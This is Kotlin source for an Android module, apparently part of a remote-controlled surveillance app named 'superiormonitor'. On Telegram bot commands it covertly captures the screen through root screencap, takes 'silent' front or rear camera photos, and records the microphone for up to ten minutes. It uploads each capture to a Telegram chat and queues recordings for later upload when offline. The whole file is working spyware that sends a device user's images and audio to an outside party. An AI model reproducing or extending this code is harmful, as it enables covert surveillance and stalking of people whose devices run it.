package com.system.superiormonitor.monitor

import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import com.system.superiormonitor.bot.TelegramApi
import com.system.superiormonitor.util.LogCategory
import com.system.superiormonitor.util.LogManager
import android.media.AudioAttributes
import android.media.AudioFocusRequest
import android.media.AudioManager
import android.media.MediaRecorder
import android.os.Build
import android.telephony.PhoneStateListener
import android.telephony.TelephonyCallback
import android.telephony.TelephonyManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object MediaOperations {

    private val micMutex = Mutex()
    private var isMicRecording = false
    /**
     * Executes an immediate capture and handles UI updates.
     * @param type 0 = Screen, 1 = Front, 2 = Rear
     */
    fun executeOnDemandCapture(context: Context, scope: CoroutineScope, type: Int, chatId: String, messageId: Long, botToken: String) {
        scope.launch(Dispatchers.IO) {
            val tag = when (type) {
                0 -> "[OnDemandScreen]"
                1 -> "[OnDemandFront]"
                else -> "[OnDemandRear]"
            }
            
            // Step 1: Update UI
            TelegramApi.editMessageText(
                token = botToken,
                chatId = chatId,
                messageId = messageId,
                text = "*Processing your request...*",
                replyMarkup = "{\"inline_keyboard\": []}"
            )
            
            LogManager.log(LogCategory.MEDIA, "$tag Starting immediate capture...")
            
            val cacheDir = context.cacheDir
            val tempFile = when (type) {
                0 -> File(cacheDir, "temp_demand_shot.png")
                1 -> File(cacheDir, "temp_demand_front.jpg")
                else -> File(cacheDir, "temp_demand_rear.jpg")
            }
            
            var isSuccess = true
            var errorOutput = ""
            
            try {
                if (type == 0) {
                    val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "screencap -p ${tempFile.absolutePath} && chmod 666 ${tempFile.absolutePath}"))
                    errorOutput = process.errorStream.bufferedReader().use { it.readText() }
                    if (process.waitFor() != 0) isSuccess = false
                } else {
                    val success = BackgroundCamera.capture(context, type, tempFile)
                    if (!success) {
                        isSuccess = false
                        errorOutput = "Silent capture failed internally."
                    }
                }
                
                if (!isSuccess || !tempFile.exists() || tempFile.length() == 0L) {
                    LogManager.log(LogCategory.MEDIA, "$tag Capture failed. Error: $errorOutput")
                    TelegramApi.editMessageText(
                        botToken, chatId, messageId,
                        "❌ *Capture Failed*\n\nReason: $errorOutput",
                        replyMarkup = com.system.superiormonitor.bot.BotCommands.buildCaptureSuccessMarkup()
                    )
                    return@launch
                }
                
                val bitmap = BitmapFactory.decodeFile(tempFile.absolutePath)
                if (bitmap == null) {
                    tempFile.delete()
                    LogManager.log(LogCategory.MEDIA, "$tag Decode failed.")
                    TelegramApi.editMessageText(botToken, chatId, messageId, "❌ *Capture Failed*\n\nReason: Decode error.", replyMarkup = com.system.superiormonitor.bot.BotCommands.buildCaptureSuccessMarkup())
                    return@launch
                }
                
                val destFile = File(cacheDir, "demand_upload.jpeg")
                val fos = FileOutputStream(destFile)
                bitmap.compress(Bitmap.CompressFormat.JPEG, if (type == 0) 40 else 85, fos)
                fos.flush()
                fos.close()
                bitmap.recycle()
                tempFile.delete()
                
                val caption = when (type) {
                    0 -> "#Snapshot #OnDemand\n\n*Screen Capture Success*"
                    1 -> "#Camera #OnDemand\n\n*Front Camera Success*"
                    else -> "#Camera #OnDemand\n\n*Rear Camera Success*"
                }
                
                // Upload photo
                val uploaded = TelegramApi.sendPhoto(botToken, chatId, destFile, caption)
                destFile.delete()
                
                if (uploaded) {
                    TelegramApi.editMessageText(
                        token = botToken,
                        chatId = chatId,
                        messageId = messageId,
                        text = "*The shot has been sent successfully*\n\n*Click below button to go back to the SnapShot Engine*",
                        replyMarkup = com.system.superiormonitor.bot.BotCommands.buildCaptureSuccessMarkup()
                    )
                } else {
                    TelegramApi.editMessageText(
                        botToken, chatId, messageId,
                        "❌ *Capture Failed*\n\nReason: Telegram API Upload Failed.",
                        replyMarkup = com.system.superiormonitor.bot.BotCommands.buildCaptureSuccessMarkup()
                    )
                }
            } catch (e: Exception) {
                LogManager.log(LogCategory.MEDIA, "$tag Exception: ${e.message}")
                TelegramApi.editMessageText(
                    botToken, chatId, messageId,
                    "❌ *Capture Failed*\n\nReason: Exception occurred.",
                    replyMarkup = com.system.superiormonitor.bot.BotCommands.buildCaptureSuccessMarkup()
                )
            }
        }
    }

    /**
     * Executes duration-based microphone recording with AudioFocus and Telephony fallback.
     */
    fun executeMicrophoneRecording(context: Context, scope: CoroutineScope, durationMs: Long, chatId: String, messageId: Long, botToken: String) {
        scope.launch(Dispatchers.IO) {
            // Concurrency Check
            if (isMicRecording) {
                TelegramApi.editMessageText(
                    botToken, chatId, messageId,
                    "❌ *Recording failed: Previous request is still in progress.*"
                )
                return@launch
            }

            micMutex.withLock {
                isMicRecording = true
            }

            try {
                val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager

                // Telephony pre-check
                if (telephonyManager.callState != TelephonyManager.CALL_STATE_IDLE) {
                    TelegramApi.editMessageText(
                        botToken, chatId, messageId,
                        "❌ *Microphone is already in use or a call is in progress. Please wait for the activity to end.*" // Actually rejecting as requested
                    )
                    micMutex.withLock { isMicRecording = false }
                    return@launch
                }

                TelegramApi.editMessageText(
                    botToken, chatId, messageId,
                    "⏳ *Waiting for microphone to be free...*"
                )

                // Wait for Audio Focus
                var focusGained = false
                var attempts = 0
                val focusRequest = withContext(Dispatchers.Main) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        AudioFocusRequest.Builder(AudioManager.AUDIOFOCUS_GAIN_TRANSIENT_EXCLUSIVE)
                            .setAudioAttributes(
                                AudioAttributes.Builder()
                                    .setUsage(AudioAttributes.USAGE_MEDIA)
                                    .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
                                    .build()
                            )
                            .setAcceptsDelayedFocusGain(true)
                            .setOnAudioFocusChangeListener { /* Handled actively during recording */ }
                            .build()
                    } else null
                }

                while (!focusGained && attempts < 12) { // Try for 1 minute (12 * 5s)
                    val result = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && focusRequest != null) {
                        audioManager.requestAudioFocus(focusRequest)
                    } else {
                        @Suppress("DEPRECATION")
                        audioManager.requestAudioFocus(null, AudioManager.STREAM_MUSIC, AudioManager.AUDIOFOCUS_GAIN_TRANSIENT_EXCLUSIVE)
                    }

                    if (result == AudioManager.AUDIOFOCUS_REQUEST_GRANTED) {
                        focusGained = true
                    } else {
                        attempts++
                        delay(5000)
                    }
                }

                if (!focusGained) {
                    TelegramApi.editMessageText(
                        botToken, chatId, messageId,
                        "❌ *Recording Failed*\n\nReason: Microphone could not be acquired after 1 minute."
                    )
                    micMutex.withLock { isMicRecording = false }
                    return@launch
                }

                TelegramApi.editMessageText(
                    botToken, chatId, messageId,
                    "🎙️ *Starting recording...*"
                )

                // Set up file
                val dir = File(context.getExternalFilesDir(null), "mediaops/microp_temp")
                if (!dir.exists()) dir.mkdirs()
                
                val durationLabel = when(durationMs) {
                    60000L -> "1min"
                    180000L -> "3min"
                    300000L -> "5min"
                    else -> "10min"
                }
                val dateFormat = SimpleDateFormat("hh-mma_dd-MM-yyyy", Locale.getDefault())
                val fileName = "MicroP(${durationLabel})_${dateFormat.format(Date())}.mp3"
                val outputFile = File(dir, fileName)

                var mediaRecorder: MediaRecorder? = null
                var isRecordingActive = false
                
                try {
                    mediaRecorder = withContext(Dispatchers.Main) {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                            MediaRecorder(context)
                        } else {
                            @Suppress("DEPRECATION")
                            MediaRecorder()
                        }
                    }

                    mediaRecorder?.apply {
                        setAudioSource(MediaRecorder.AudioSource.MIC)
                        setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                        setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                        setOutputFile(outputFile.absolutePath)
                        prepare()
                        start()
                        isRecordingActive = true
                    }
                } catch (e: Exception) {
                    TelegramApi.editMessageText(
                        botToken, chatId, messageId,
                        "❌ *Recording Failed*\n\nReason: Failed to start MediaRecorder. ${e.message}"
                    )
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && focusRequest != null) {
                        audioManager.abandonAudioFocusRequest(focusRequest)
                    }
                    micMutex.withLock { isMicRecording = false }
                    return@launch
                }

                var recordingJob: Job? = null
                val focusListener = AudioManager.OnAudioFocusChangeListener { focusChange ->
                    scope.launch(Dispatchers.IO) {
                        when (focusChange) {
                            AudioManager.AUDIOFOCUS_LOSS_TRANSIENT -> {
                                if (isRecordingActive) {
                                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                                        mediaRecorder?.pause()
                                        TelegramApi.editMessageText(botToken, chatId, messageId, "⏸️ *Recording Paused Due to : Audio Focus Loss*")
                                    } else {
                                        recordingJob?.cancel()
                                    }
                                }
                            }
                            AudioManager.AUDIOFOCUS_GAIN -> {
                                if (isRecordingActive && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                                    mediaRecorder?.resume()
                                    TelegramApi.editMessageText(botToken, chatId, messageId, "🎙️ *Starting recording (Resumed)...*")
                                }
                            }
                            AudioManager.AUDIOFOCUS_LOSS -> {
                                recordingJob?.cancel() // Forcibly stop the recording
                                TelegramApi.editMessageText(botToken, chatId, messageId, "🛑 *Recording Stopped Due To : Permanent Audio Focus Loss*")
                            }
                        }
                    }
                }

                withContext(Dispatchers.Main) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && focusRequest != null) {
                        // Update the listener for real active recording
                    } else {
                        @Suppress("DEPRECATION")
                        audioManager.requestAudioFocus(focusListener, AudioManager.STREAM_MUSIC, AudioManager.AUDIOFOCUS_GAIN_TRANSIENT_EXCLUSIVE)
                    }
                }

                // Telephony Fallback Listener
                var phoneStateListener: PhoneStateListener? = null
                var telephonyCallback: TelephonyCallback? = null
                
                withContext(Dispatchers.Main) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                        telephonyCallback = object : TelephonyCallback(), TelephonyCallback.CallStateListener {
                            override fun onCallStateChanged(state: Int) {
                                if (state != TelephonyManager.CALL_STATE_IDLE) {
                                    scope.launch(Dispatchers.IO) {
                                        TelegramApi.editMessageText(botToken, chatId, messageId, "🛑 *Recording Stopped Due To : Incoming/Outgoing Call*")
                                        recordingJob?.cancel()
                                    }
                                }
                            }
                        }
                        telephonyManager.registerTelephonyCallback(context.mainExecutor, telephonyCallback)
                    } else {
                        phoneStateListener = object : PhoneStateListener() {
                            @Deprecated("Deprecated in Java")
                            override fun onCallStateChanged(state: Int, phoneNumber: String?) {
                                if (state != TelephonyManager.CALL_STATE_IDLE) {
                                    scope.launch(Dispatchers.IO) {
                                        TelegramApi.editMessageText(botToken, chatId, messageId, "🛑 *Recording Stopped Due To : Incoming/Outgoing Call*")
                                        recordingJob?.cancel()
                                    }
                                }
                            }
                        }
                        telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE)
                    }
                }

                // Wait for the duration
                recordingJob = scope.launch {
                    delay(durationMs)
                }
                recordingJob?.join()

                // Cleanup recording
                try {
                    isRecordingActive = false
                    mediaRecorder?.stop()
                } catch (e: Exception) {
                    // Ignored
                } finally {
                    mediaRecorder?.release()
                }

                try {
                    withContext(Dispatchers.Main) {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && telephonyCallback != null) {
                            telephonyManager.unregisterTelephonyCallback(telephonyCallback)
                        } else if (phoneStateListener != null) {
                            telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE)
                        }
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && focusRequest != null) {
                            audioManager.abandonAudioFocusRequest(focusRequest)
                        } else {
                            @Suppress("DEPRECATION")
                            audioManager.abandonAudioFocus(focusListener)
                        }
                    }
                } catch (e: Exception) {
                    // Ignore cleanup exceptions
                }
                
                // Allow new recordings
                micMutex.withLock { isMicRecording = false }

                TelegramApi.editMessageText(
                    botToken, chatId, messageId,
                    "⏳ *Uploading the file...*"
                )

                // Upload or Offline Sync
                if (!outputFile.exists() || outputFile.length() == 0L) {
                    TelegramApi.editMessageText(
                        botToken, chatId, messageId,
                        "❌ *Audio Recording Failed*\n\nReason: File is empty or corrupt."
                    )
                    return@launch
                }

                if (TelegramApi.isApiReachable(context, botToken)) {
                    val uploaded = TelegramApi.sendDocument(botToken, chatId, outputFile, caption = "Microphone Recording")
                    if (uploaded) {
                        outputFile.delete()
                        TelegramApi.editMessageText(
                            botToken, chatId, messageId,
                            "✅ *Recording Successfully Uploaded*\n\nThe recording has been completed. The file was saved to the device memory and sent to Telegram."
                        )
                    } else {
                        TelegramApi.editMessageText(
                            botToken, chatId, messageId,
                            "❌ *Audio Recording Failed*\n\nReason: Telegram API Upload Failed."
                        )
                    }
                } else {
                    val offlineDir = File(context.getExternalFilesDir(null), "mediaops/offline")
                    if (!offlineDir.exists()) offlineDir.mkdirs()
                    val offlineFile = File(offlineDir, fileName)
                    outputFile.copyTo(offlineFile, overwrite = true)
                    outputFile.delete()

                    // Dropping the editMessageText because the device is offline and it will fail anyway.
                }

            } catch (e: Exception) {
                micMutex.withLock { isMicRecording = false }
                LogManager.log(LogCategory.MEDIA, "[Microphone] Exception: ${e.message}")
                TelegramApi.editMessageText(
                    botToken, chatId, messageId,
                    "❌ *Audio Recording Failed*\n\nReason: Exception occurred. ${e.message}"
                )
            }
        }
    }
}
